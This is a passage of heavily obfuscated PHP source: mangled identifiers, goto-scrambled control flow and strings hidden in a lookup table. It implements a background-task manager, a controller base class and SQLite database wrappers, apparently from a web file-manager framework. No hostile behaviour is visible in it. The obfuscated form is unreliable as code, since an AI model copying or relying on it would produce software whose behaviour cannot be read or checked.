($FæÛ›ŠÏ¤[$EçŒ¥ˆãØà[29]]) { case $EçŒ¥ˆãØà[291]: $A“ø‚†‘¯ = url_request($FæÛ›ŠÏ¤[$EçŒ¥ˆãØà[1397]], $EçŒ¥ˆãØà[212], !1, !1, !1, !1, 5); $bè²ÇÙ˜‡Ü = strlen($A“ø‚†‘¯); break; case $EçŒ¥ˆãØà[211]: $bè²ÇÙ˜‡Ü = Hook::apply($FæÛ›ŠÏ¤[$EçŒ¥ˆãØà[1397]]); default: break; } goto a¥Ş¡ÉñÑ‹; D¿ßâ‹…â: $EçŒ¥ˆãØà =& $_SERVER[»„]; self::log($EçŒ¥ˆãØà[1394] . $FæÛ›ŠÏ¤[$EçŒ¥ˆãØà[363]] . $EçŒ¥ˆãØà[1395] . $FæÛ›ŠÏ¤[$EçŒ¥ˆãØà[28]] . $EçŒ¥ˆãØà[1396] . $FæÛ›ŠÏ¤[$EçŒ¥ˆãØà[1397]]); Model($EçŒ¥ˆãØà[1380])->run($FæÛ›ŠÏ¤[$EçŒ¥ˆãØà[363]]); goto dàÀ£à÷™; Dˆ„öùßŠ: } private static function valueGet($F«Ÿ–á½) { $dîæñ¾×ƒ¿ =& $_SERVER[»„]; $f¤Œï¶•åÒ = $dîæñ¾×ƒ¿[1406]; $c¹¦™‹¸–ë = Model($dîæñ¾×ƒ¿[1407])->get($F«Ÿ–á½, $f¤Œï¶•åÒ); if (is_null($c¹¦™‹¸–ë)) { Model($dîæñ¾×ƒ¿[1407])->set($dîæñ¾×ƒ¿[1378], 10, $f¤Œï¶•åÒ); Model($dîæñ¾×ƒ¿[1407])->set($dîæñ¾×ƒ¿[677], $dîæñ¾×ƒ¿[83], $f¤Œï¶•åÒ); Model($dîæñ¾×ƒ¿[1407])->set($dîæñ¾×ƒ¿[1373], $dîæñ¾×ƒ¿[464], $f¤Œï¶•åÒ); $c¹¦™‹¸–ë = Model($dîæñ¾×ƒ¿[1407])->get($F«Ÿ–á½, $f¤Œï¶•åÒ); } return $c¹¦™‹¸–ë; } private static function valueSet($AÔ–¸™ ïÎ, $Aó¶’ŞÎâ¼) { $añôÍ´’ê¯ =& $_SERVER[»„]; return Model($añôÍ´’ê¯[1407])->set($AÔ–¸™ ïÎ, $Aó¶’ŞÎâ¼, $añôÍ´’ê¯[1406]); } protected static function log($Aš ŞÁ‰Äß) { write_log($Aš ŞÁ‰Äß, $_SERVER[»„][1408]); } private static function cacheClear() { $B×ø®ñ˜îÉ =& $_SERVER[»„]; $D±§ç¡–—  = Model($B×ø®ñ˜îÉ[1407])->cacheKey($B×ø®ñ˜îÉ[1406]); Cache::clearMemory($D±§ç¡–— ); } } class Task { const STATYS_STOP = "\x73\164\157\160"; const STATYS_RUNNING = "\x72\165\x6e\156\151\x6e\147"; const STATYS_KILL = "\x6b\x69\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($eÈ–¾Àè²¬, $Fä¡´îÁÓ‡ = '', $a¼•ó³˜¥Õ = 0, $cèë„î¹Ì¤ = '') { goto BØÔëÑÄÕÈ; BØÔëÑÄÕÈ: $Dá¦ã¦Ùç° =& $_SERVER[»„]; if (self::get($eÈ–¾Àè²¬)) { return; } $this->task = array($Dá¦ã¦Ùç°[363] => $eÈ–¾Àè²¬, $Dá¦ã¦Ùç°[1409] => USER_ID, $Dá¦ã¦Ùç°[1316] => $cèë„î¹Ì¤, $Dá¦ã¦Ùç°[29] => $Fä¡´îÁÓ‡, $Dá¦ã¦Ùç°[968] => $Dá¦ã¦Ùç°[33], $Dá¦ã¦Ùç°[966] => $a¼•ó³˜¥Õ, $Dá¦ã¦Ùç°[978] => 0, $Dá¦ã¦Ùç°[1410] => 0, $Dá¦ã¦Ùç°[1411] => 0, $Dá¦ã¦Ùç°[1412] => timeFloat(), $Dá¦ã¦Ùç°[1413] => 0, $Dá¦ã¦Ùç°[1414] => 0, $Dá¦ã¦Ùç°[1415] => 0, $Dá¦ã¦Ùç°[1416] => 0, $Dá¦ã¦Ùç°[677] => $Dá¦ã¦Ùç°[1373]); goto a¾‰áíåÜÆ; eŠ®èöŒÇ: Hook::trigger($Dá¦ã¦Ùç°[1420], $this->task); $this->task[$Dá¦ã¦Ùç°[1414]] = timeFloat(); self::valueSet($this->task[$Dá¦ã¦Ùç°[363]], $this->task); goto BÁ°ôé¥®–; a¾‰áíåÜÆ: Hook::bind($Dá¦ã¦Ùç°[1375], array($this, $Dá¦ã¦Ùç°[1417])); Hook::bind($Dá¦ã¦Ùç°[1418], array($this, $Dá¦ã¦Ùç°[1419])); $this->startAfter(); goto eŠ®èöŒÇ; BÁ°ôé¥®–: } public function end() { goto F—‹×øÔµõ; F—‹×øÔµõ: $c®èë¤°È£ =& $_SERVER[»„]; if (!$this->task) { return; } if ($this->task[$c®èë¤°È£[1414]]) { self::valueSet($this->task[$c®èë¤°È£[363]], !1); } goto b™×‡ÏÈæ; ešĞ¡”òÃº: Hook::unbind($c®èë¤°È£[1418], array($this, $c®èë¤°È£[1419])); $this->endAfter(); $this->task = !1; goto DÆÖÑÌè; b™×‡ÏÈæ: $CÆŒ®î°Î = timeFloat() - $this->task[$c®èë¤°È£[1412]]; self::log($c®èë¤°È£[1421] . $this->task[$c®èë¤°È£[363]] . $c®èë¤°È£[1422] . $CÆŒ®î°Î . $c®èë¤°È£[1423]); Hook::unbind($c®èë¤°È£[1375], array($this, $c®èë¤°È£[1417])); goto ešĞ¡”òÃº; DÆÖÑÌè: } public function update($B›áª¿¼Ù¼ = 0) { goto A¹ÒĞöŒ˜; DŸ¬‰òŒ¼ì: $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[978]] += $B›áª¿¼Ù¼; $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[1413]] = timeFloat(); if ($A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[966]]) { if ($A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[966]] < $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[978]]) { $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[966]] = $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[978]]; } $e©µˆ™Ê’ = timeFloat() - $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[1412]] - $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[1415]]; $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[1410]] = $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[978]] / $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[966]]; $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[1411]] = $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[978]] / $e©µˆ™Ê’; if ($A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[1410]] > 0) { $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[1416]] = $e©µˆ™Ê’ * (1 - $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[1410]]) / $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[1410]]; } $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[1416]] = $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[1416]] <= 0 ? 0 : $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[1416]]; } goto CÏš¥†ŠŠ—; A¬Ñëç‚¾²: $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[677]] = $f•Í·¶‡æë ? $f•Í·¶‡æë : $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[677]]; $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[1415]] = $aô°§Â·¶[$b¿™ÇßÉ”Ï[1415]] ? $aô°§Â·¶[$b¿™ÇßÉ”Ï[1415]] : 0; $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[1414]] = timeFloat(); goto EĞ¶Ìõ; f®¦ÛÒ‹ ò: $aô°§Â·¶ = self::get($A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[363]]); $f•Í·¶‡æë = $aô°§Â·¶[$b¿™ÇßÉ”Ï[677]]; if ($f•Í·¶‡æë == self::STATYS_KILL) { $EäìÚŠù³£ = array($b¿™ÇßÉ”Ï[1424] => LNG($b¿™ÇßÉ”Ï[1425]), $b¿™ÇßÉ”Ï[1020] => !1); Cache::set($b¿™ÇßÉ”Ï[1426] . $this->task[$b¿™ÇßÉ”Ï[363]], $EäìÚŠù³£, 30); $this->end(); die; } else { if ($f•Í·¶‡æë == self::STATYS_STOP) { $dÔªÚŒ Û¼ = 2; $aô°§Â·¶[$b¿™ÇßÉ”Ï[1415]] += $dÔªÚŒ Û¼; self::valueSet($A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[363]], $aô°§Â·¶); sleep($dÔªÚŒ Û¼); $this->update(); return; } } goto A¬Ñëç‚¾²; CÏš¥†ŠŠ—: $this->updateAfter(); $DĞ°ÚÅ¢˜ = 0.2; if (timeFloat() - $A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[1414]] < $DĞ°ÚÅ¢˜) { return; } goto f®¦ÛÒ‹ ò; A¹ÒĞöŒ˜: $b¿™ÇßÉ”Ï =& $_SERVER[»„]; $A¥óÉ¶ƒïÛ =& $this->task; if (!$A¥óÉ¶ƒïÛ) { return; } goto DŸ¬‰òŒ¼ì; EĞ¶Ìõ: Hook::trigger($b¿™ÇßÉ”Ï[1427], $A¥óÉ¶ƒïÛ); self::valueSet($A¥óÉ¶ƒïÛ[$b¿™ÇßÉ”Ï[363]], $A¥óÉ¶ƒïÛ); goto a‡”óÂ†¥; a‡”óÂ†¥: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($c²èØ»’†) { $bì½ÃÕ™« =& $_SERVER[»„]; Cache::set($bì½ÃÕ™«[1426] . $this->task[$bì½ÃÕ™«[363]], $c²èØ»’†, 60); return $c²èØ»’†; } public static function get($B¬”†Ê½Ç) { return self::valueGet($B¬”†Ê½Ç); } public static function listData() { $aÖêŒØ©Û = self::valueGet(); return array_sort_by($aÖêŒØ©Û, $_SERVER[»„][1412], !0); } public static function kill($a›àëáŸõš) { return self::changeStatus($a›àëáŸõš, self::STATYS_KILL); } public static function stop($CÍó¹ğ½ã) { return self::changeStatus($CÍó¹ğ½ã, self::STATYS_STOP); } public static function restart($A´ë×ŒÍœã) { return self::changeStatus($A´ë×ŒÍœã, self::STATYS_RUNNING); } public static function killAll() { $a‡íî¡î” =& $_SERVER[»„]; $bŸÚ¨ƒğ = self::listData(); foreach ($bŸÚ¨ƒğ as $F¸´Œ³Úë–) { self::kill($F¸´Œ³Úë–[$a‡íî¡î”[363]]); } sleep(2); foreach ($bŸÚ¨ƒğ as $F¸´Œ³Úë–) { self::valueSet($F¸´Œ³Úë–[$a‡íî¡î”[363]], !1); } } private static function changeStatus($dË¼«Æ÷İî, $cğæî¯¼ğë) { goto e‹¢“é¶ ›; c¼™ĞØ¬ÉŠ: return !0; goto EÜ¡ »Œ“¿; CÁ¤²ªÙâº: $FÊÓŞÓ© »[$DœÌ‚»Õ¤¼[677]] = $cğæî¯¼ğë; self::valueSet($dË¼«Æ÷İî, $FÊÓŞÓ© »); self::log($DœÌ‚»Õ¤¼[1428] . $FÊÓŞÓ© »[$DœÌ‚»Õ¤¼[363]] . $DœÌ‚»Õ¤¼[1429] . $cğæî¯¼ğë); goto c¼™ĞØ¬ÉŠ; e‹¢“é¶ ›: $DœÌ‚»Õ¤¼ =& $_SERVER[»„]; $FÊÓŞÓ© » = self::valueGet($dË¼«Æ÷İî); if (!$FÊÓŞÓ© ») { return !1; } goto CÁ¤²ªÙâº; EÜ¡ »Œ“¿: } public static function valueGet($bÈ“Êª±™» = false) { $a¯®ÕÅ¶ =& $_SERVER[»„]; if ($bÈ“Êª±™») { $b´Ú´ÚÄ´™ = Model($a¯®ÕÅ¶[395])->where(array($a¯®ÕÅ¶[89] => $bÈ“Êª±™», $a¯®ÕÅ¶[29] => $a¯®ÕÅ¶[1430]))->find(); return $b´Ú´ÚÄ´™ ? json_decode($b´Ú´ÚÄ´™[$a¯®ÕÅ¶[355]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($DÈ¹»èŸôğ = false) { goto fŠ÷°ã¡ÀÙ; cĞä¬ààóÕ: return $C’¥„¡ê¥; goto b‘ËÑíßõ¼; fŠ÷°ã¡ÀÙ: $eâ‘ÆÏ‡àÔ =& $_SERVER[»„]; $cÕ›ÀõÛ© = array($eâ‘ÆÏ‡àÔ[29] => $eâ‘ÆÏ‡àÔ[1430]); if ($DÈ¹»èŸôğ) { $cÕ›ÀõÛ©[$eâ‘ÆÏ‡àÔ[1409]] = $DÈ¹»èŸôğ; } goto dŞÓóÚÛø; dŞÓóÚÛø: $C’¥„¡ê¥ = Model($eâ‘ÆÏ‡àÔ[395])->where($cÕ›ÀõÛ©)->select(); $C’¥„¡ê¥ = $C’¥„¡ê¥ ? $C’¥„¡ê¥ : array(); foreach ($C’¥„¡ê¥ as $b°­áï¨„‚ => $E‚¥£²˜‘ˆ) { $C’¥„¡ê¥[$b°­áï¨„‚] = json_decode($E‚¥£²˜‘ˆ[$eâ‘ÆÏ‡àÔ[355]], !0); } goto cĞä¬ààóÕ; b‘ËÑíßõ¼: } public static function valueSet($bÜÒÎØÁ¨À, $d÷ÈòÙÆ) { goto dœ¶¢¼áÏŠ; fğÔ…„©Õ: if (!$eˆùùÊá) { ob_start(); var_dump($d÷ÈòÙÆ); $c‹Ù¯Ş’¥ = ob_get_clean(); self::log($AÏÆïõìÁÙ[1431] . json_encode_force($c‹Ù¯Ş’¥)); } if (!$bÜÒÎØÁ¨À || !$d÷ÈòÙÆ[$AÏÆïõìÁÙ[363]]) { return !1; } $EŞ«òÎğìç = array($AÏÆïõìÁÙ[29] => $AÏÆïõìÁÙ[1430], $AÏÆïõìÁÙ[1409] => USER_ID, $AÏÆïõìÁÙ[89] => $bÜÒÎØÁ¨À, $AÏÆïõìÁÙ[355] => $eˆùùÊá); goto E‰îÈ¬ì×; dœ¶¢¼áÏŠ: $AÏÆïõìÁÙ =& $_SERVER[»„]; if (!$d÷ÈòÙÆ) { return Model($AÏÆïõìÁÙ[395])->where(array($AÏÆïõìÁÙ[89] => $bÜÒÎØÁ¨À, $AÏÆïõìÁÙ[29] => $AÏÆïõìÁÙ[1430]))->delete(); } $eˆùùÊá = json_encode($d÷ÈòÙÆ); goto fğÔ…„©Õ; E‰îÈ¬ì×: Model($AÏÆïõìÁÙ[395])->add($EŞ«òÎğìç, array(), !0); goto FÖÜ²ÍøŠ; FÖÜ²ÍøŠ: } public static function log($cçœóËĞÏ„) { write_log($cçœóËĞÏ„, $_SERVER[»„][1432]); } } goto eŒš£ÆíŒ¿; B˜¦ÜµÙ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto d—¼…ğ¶æÌ; d—¼…ğ¶æÌ: $b‰‚óîÅê =& $_SERVER[»„]; global $in, $config; $this->config =& $config; goto C¬îßôÜÌÁ; C¬îßôÜÌÁ: $this->in =& $in; $this->values[$b‰‚óîÅê[6]] =& $config; $this->values[$b‰‚óîÅê[7]] =& $in; goto B‡×Š°ÀÑ; B‡×Š°ÀÑ: $this->tpl = TEMPLATE . MOD . $b‰‚óîÅê[8]; $this->_classObjectID = mt_rand(0, 10000); goto a‚’¿èê‘; a‚’¿èê‘: } public function loadClass($bÀ‡‰ÎÛ´’) { if (1 === func_num_args()) { $this->{$bÀ‡‰ÎÛ´’} = new $bÀ‡‰ÎÛ´’(); } else { $dì«¶İƒÜ¼ = new ReflectionClass($bÀ‡‰ÎÛ´’); $b¿¦ÍÕê×˜ = func_get_args(); array_shift($b¿¦ÍÕê×˜); $this->{$bÀ‡‰ÎÛ´’} = $dì«¶İƒÜ¼->newInstanceArgs($b¿¦ÍÕê×˜); } return $this->{$bÀ‡‰ÎÛ´’}; } protected function assign($D»×™Œ‹“¾, $bÀÄ¢Î›ÇÈ) { $this->values[$D»×™Œ‹“¾] = $bÀÄ¢Î›ÇÈ; } protected function display($bƒó»µó¬) { ob_end_clean(); extract($this->values); require $this->tpl . $bƒó»µó¬; } } class DbSqliteBase extends Db { public function __construct($e°”ñ¤¯â = '') { $BØÃì¦¨²ë =& $_SERVER[»„]; if (!extension_loaded($BØÃì¦¨²ë[9])) { think_exception(think_lang($BØÃì¦¨²ë[10]) . $BØÃì¦¨²ë[11]); } if (!empty($e°”ñ¤¯â)) { if (!isset($e°”ñ¤¯â[$BØÃì¦¨²ë[12]])) { $e°”ñ¤¯â[$BØÃì¦¨²ë[12]] = 438; } $this->config = $e°”ñ¤¯â; if (empty($this->config[$BØÃì¦¨²ë[13]])) { $this->config[$BØÃì¦¨²ë[13]] = array(); } } } public function connect($A§ÕØ™‘ = '', $b˜›ˆõ‰„¹ = 0) { $Cõ¢Ë¢—¶ =& $_SERVER[»„]; if (!isset($this->linkID[$b˜›ˆõ‰„¹])) { goto F’šÙ¼ä‚å; DãÕŠ¢÷Ş: $this->linkID[$b˜›ˆõ‰„¹] = $f½÷‚…‹™($A§ÕØ™‘[$Cõ¢Ë¢—¶[17]], $A§ÕØ™‘[$Cõ¢Ë¢—¶[12]]); if (!$this->linkID[$b˜›ˆõ‰„¹]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto eñ¨ÕêÅˆ; F’šÙ¼ä‚å: if (empty($A§ÕØ™‘)) { $A§ÕØ™‘ = $this->config; } $dõ™öèŠ²í = !empty($A§ÕØ™‘[$Cõ¢Ë¢—¶[13]][$Cõ¢Ë¢—¶[14]]) ? $A§ÕØ™‘[$Cõ¢Ë¢—¶[13]][$Cõ¢Ë¢—¶[14]] : $this->pconnect; $f½÷‚…‹™ = $dõ™öèŠ²í ? $Cõ¢Ë¢—¶[15] : $Cõ¢Ë¢—¶[16]; goto DãÕŠ¢÷Ş; eñ¨ÕêÅˆ: @sqlite_busy_timeout($this->linkID[$b˜›ˆõ‰„¹], 30000); if (1 != think_config($Cõ¢Ë¢—¶[18])) { unset($this->config); } goto a•ŸÊÆâÔÌ; a•ŸÊÆâÔÌ: } return $this->linkID[$b˜›ˆõ‰„¹]; } public function free() { $this->queryID = null; } public function query($dİùİâÙ´é) { goto Aï„°ÉÎÄÇ; Aï„°ÉÎÄÇ: $c¨’¸¥Í =& $_SERVER[»„]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto b·¢åÒº³¦; EÎ¤¿ØëõÉ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $cŠ„Ş¢õ„³ = $this->getAll(); return $cŠ„Ş¢õ„³; } goto E¨ÃàÀ§ ´; b·¢åÒº³¦: $this->queryStr = $dİùİâÙ´é; if ($this->queryID) { $this->free(); } think_action_status($c¨’¸¥Í[19], 1); goto c’«•«¡’æ; c’«•«¡’æ: think_status($c¨’¸¥Í[20]); $this->queryID = sqlite_query($this->_linkID, $dİùİâÙ´é); $this->debug(); goto EÎ¤¿ØëõÉ; E¨ÃàÀ§ ´: } public function execute($B‰àù­ÏÉ) { goto c¦‚ÙöÛÔí; c¦‚ÙöÛÔí: $e¨É’äóã¢ =& $_SERVER[»„]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto dÜ”óœë’; dÜ”óœë’: $this->queryStr = $B‰àù­ÏÉ; if ($this->queryID) { $this->free(); } think_action_status($e¨É’äóã¢[21], 1); goto cÒ®«ªÑøÄ; b»´Ñ•ÓË±: if (!1 === $E©…âÆñÈ±) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto C’ß™–í; cÒ®«ªÑøÄ: think_status($e¨É’äóã¢[20]); $E©…âÆñÈ± = sqlite_exec($this->_linkID, $B‰àù­ÏÉ); $this->debug(); goto b»´Ñ•ÓË±; C’ß™–í: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[»„][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $E«£ø£ÛÙ = sqlite_query($this->_linkID, $_SERVER[»„][23]); if (!$E«£ø£ÛÙ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Eˆ‘Ë²ÓÏ = sqlite_query($this->_linkID, $_SERVER[»„][24]); if (!$Eˆ‘Ë²ÓÏ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $e«¯ğĞé†Ş = array(); if ($this->numRows > 0) { for ($AÁÛŒÛæ˜Í = 0; $AÁÛŒÛæ˜Í < $this->numRows; $AÁÛŒÛæ˜Í++) { $e«¯ğĞé†Ş[$AÁÛŒÛæ˜Í] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $e«¯ğĞé†Ş; } public function getFields($eØ½Ñæß‘²) { $bŸ§Ää„óª =& $_SERVER[»„]; $dŠÎ…ˆ¦í­ = $this->query($bŸ§Ää„óª[25] . $eØ½Ñæß‘² . $bŸ§Ää„óª[26]); $D”¬Ìéá“ = array(); if ($dŠÎ…ˆ¦í­) { foreach ($dŠÎ…ˆ¦í­ as $Eò§ó´°Ö¥ => $Aòæ¦›âªÛ) { $D”¬Ìéá“[$Aòæ¦›âªÛ[$bŸ§Ää„óª[27]]] = array($bŸ§Ää„óª[28] => $Aòæ¦›âªÛ[$bŸ§Ää„óª[27]], $bŸ§Ää„óª[29] => $Aòæ¦›âªÛ[$bŸ§Ää„óª[30]], $bŸ§Ää„óª[31] => (bool) ($Aòæ¦›âªÛ[$bŸ§Ää„óª[32]] === $bŸ§Ää„óª[33]), $bŸ§Ää„óª[34] => $Aòæ¦›âªÛ[$bŸ§Ää„óª[35]], $bŸ§Ää„óª[36] => strtolower($Aòæ¦›âªÛ[$bŸ§Ää„óª[37]]) == $bŸ§Ää„óª[38], $bŸ§Ää„óª[39] => strtolower($Aòæ¦›âªÛ[$bŸ§Ää„óª[40]]) == $bŸ§Ää„óª[41]); } } return $D”¬Ìéá“; } public function getTables($EØ‡¸Ó°´Ø = '') { $A «‚•ù˜ =& $_SERVER[»„]; $Eæ½¹œ£À = $this->query($A «‚•ù˜[42] . $A «‚•ù˜[43] . $A «‚•ù˜[44]); $e…”—‹‹ = array(); foreach ($Eæ½¹œ£À as $c¦œëÙ¹×Ø => $f¿öÊ©ÔË¦) { $e…”—‹‹[$c¦œëÙ¹×Ø] = current($f¿öÊ©ÔË¦); } return $e…”—‹‹; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $fåï­ŸÍ¯ø =& $_SERVER[»„]; $f”‘šíİÈ‚ = sqlite_last_error($this->_linkID); $this->error = $f”‘šíİÈ‚ . $fåï­ŸÍ¯ø[4] . sqlite_error_string($f”‘šíİÈ‚); if ($fåï­ŸÍ¯ø[33] != $this->queryStr) { $this->error .= LNG($fåï­ŸÍ¯ø[45]) . $this->queryStr; } think_trace($this->error, $fåï­ŸÍ¯ø[33], $fåï­ŸÍ¯ø[46]); return $this->error; } public function escapeString($AÆáéİÎ¹İ) { return sqlite_escape_string($AÆáéİÎ¹İ); } public function parseLimit($EÙ¶ˆñîÌƒ) { $EµŒ’Ãê¬‡ =& $_SERVER[»„]; $cÈôƒĞší˜ = $EµŒ’Ãê¬‡[33]; if (!empty($EÙ¶ˆñîÌƒ)) { $EÙ¶ˆñîÌƒ = explode($EµŒ’Ãê¬‡[47], $EÙ¶ˆñîÌƒ); if (count($EÙ¶ˆñîÌƒ) > 1) { $cÈôƒĞší˜ .= $EµŒ’Ãê¬‡[48] . $EÙ¶ˆñîÌƒ[1] . $EµŒ’Ãê¬‡[49] . $EÙ¶ˆñîÌƒ[0] . $EµŒ’Ãê¬‡[50]; } else { $cÈôƒĞší˜ .= $EµŒ’Ãê¬‡[48] . $EÙ¶ˆñîÌƒ[0] . $EµŒ’Ãê¬‡[50]; } } return $cÈôƒĞší˜; } } class DbSqlite3Base extends Db { public function __construct($d¿Á¥Âá²± = '') { $d½Ãİ­ŸÎ =& $_SERVER[»„]; if (!class_exists($d½Ãİ­ŸÎ[51])) { think_exception(think_lang($d½Ãİ­ŸÎ[10]) . $d½Ãİ­ŸÎ[52]); } if (!empty($d¿Á¥Âá²±)) { if (!isset($d¿Á¥Âá²±[$d½Ãİ­ŸÎ[12]])) { $d¿Á¥Âá²±[$d½Ãİ­ŸÎ[12]] = 438; } $this->config = $d¿Á¥Âá²±; if (empty($this->config[$d½Ãİ­ŸÎ[13]])) { $this->config[$d½Ãİ­ŸÎ[13]] = array(); } } } public function connect($BÂãò­§¾Ş = '', $aµĞø†Ùõ¿ = 0) { $eÛŒ°±×õù =& $_SERVER[»„]; if (!isset($this->linkID[$aµĞø†Ùõ¿])) { if (empty($BÂãò­§¾Ş)) { $BÂãò­§¾Ş = $this->config; } $this->linkID[$aµĞø†Ùõ¿] = new SQLite3($BÂãò­§¾Ş[$eÛŒ°±×õù[17]]); if (!$this->linkID[$aµĞø†Ùõ¿]) { think_exception($this->linkID[$aµĞø†Ùõ¿]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$aµĞø†Ùõ¿]->busyTimeout(30000); if (1 != think_config($eÛŒ°±×õù[18])) { unset($this->config); } } return $this->linkID[$aµĞø†Ùõ¿]; } public function free() { $this->queryID = null; } public function query($e©Ñ„•Ø§) { goto eĞ˜…Ò×£; BÌˆ„¨«¶: think_status($Aè†ëˆ®æ[20]); $this->queryID = $this->_linkID->query($e©Ñ„•Ø§); $this->debug(); goto AÏ«µïÒõ‡; eĞ˜…Ò×£: $Aè†ëˆ®æ =& $_SERVER[»„]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eß÷î‰æ–Ö; AÏ«µïÒõ‡: if (!1 === $this->queryID) { $this->error(); return !1; } else { $bÕœµ²Ø·Š = $this->getAll(); $this->numRows = count($bÕœµ²Ø·Š); return $bÕœµ²Ø·Š; } goto AÙĞ¾†Ù; eß÷î‰æ–Ö: $this->queryStr = $e©Ñ„•Ø§; if ($this->queryID) { $this->free(); } think_action_status($Aè†ëˆ®æ[19], 1); goto BÌˆ„¨«¶; AÙĞ¾†Ù: } public function execute($càó¢Ÿ¢øæ) { goto Cµá²ôÖÙÈ; dÄƒ¿õÛçÁ: if (!1 === $bÍÁç™Æ­Ü) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto b·‰Íùï; A²ÌÌÍÜˆ›: $this->queryStr = $càó¢Ÿ¢øæ; if ($this->queryID) { $this->free(); } think_action_status($D¤‚ØÑ÷‚ò[21], 1); goto A¼µ‰ë¯¦”; A¼µ‰ë¯¦”: think_status($D¤‚ØÑ÷‚ò[20]); $bÍÁç™Æ­Ü = $this->_linkID->exec($càó¢Ÿ¢øæ); $this->debug(); goto dÄƒ¿õÛçÁ; Cµá²ôÖÙÈ: $D¤‚ØÑ÷‚ò =& $_SERVER[»„]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A²ÌÌÍÜˆ›; b·‰Íùï: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[»„][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bå÷èÜÂ´ê = $this->_linkID->query($_SERVER[»„][23]); if (!$bå÷èÜÂ´ê) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $c£Şá›é³Û = $this->_linkID->query($_SERVER[»„][24]); if (!$c£Şá›é³Û) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $dĞ×Õë¹›¤ = array(); while ($Bµ»õœñá‰ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $dĞ×Õë¹›¤[] = $Bµ»õœñá‰; } $this->queryID->reset(); return $dĞ×Õë¹›¤; } public function getFields($AßôËˆ•¢›) { $Bñ¿çã––µ =& $_SERVER[»„]; $FÚÆ£Ÿ³ŞÌ = $this->query($Bñ¿çã––µ[25] . $AßôËˆ•¢› . $Bñ¿çã––µ[26]); $a£×‚‹‚…  = array(); if ($FÚÆ£Ÿ³ŞÌ) { foreach ($FÚÆ£Ÿ³ŞÌ as $B‘£¯¬ñÑ => $C«ÛŠÁ³‰è) { $a£×‚‹‚… [$C«ÛŠÁ³‰è[$Bñ¿çã––µ[28]]] = array($Bñ¿çã––µ[28] => $C«ÛŠÁ³‰è[$Bñ¿çã––µ[28]], $Bñ¿çã––µ[29] => $C«ÛŠÁ³‰è[$Bñ¿çã––µ[29]], $Bñ¿çã––µ[31] => (bool) ($C«ÛŠÁ³‰è[$Bñ¿çã––µ[31]] === $Bñ¿çã––µ[33]), $Bñ¿çã––µ[34] => $C«ÛŠÁ³‰è[$Bñ¿çã––µ[53]], $Bñ¿çã––µ[36] => (bool) $C«ÛŠÁ³‰è[$Bñ¿çã––µ[54]], $Bñ¿çã––µ[39] => (bool) $C«ÛŠÁ³‰è[$Bñ¿çã––µ[54]]); } } return $a£×‚‹‚… ; } public function getTables($AùääÎíë— = '') { $FƒÏ†í˜¥ =& $_SERVER[»„]; $fµ˜‰ù‘åĞ = $this->query($FƒÏ†í˜¥[42] . $FƒÏ†í˜¥[43] . $FƒÏ†í˜¥[44]); $DĞê…¯ˆÓ = array(); foreach ($fµ˜‰ù‘åĞ as 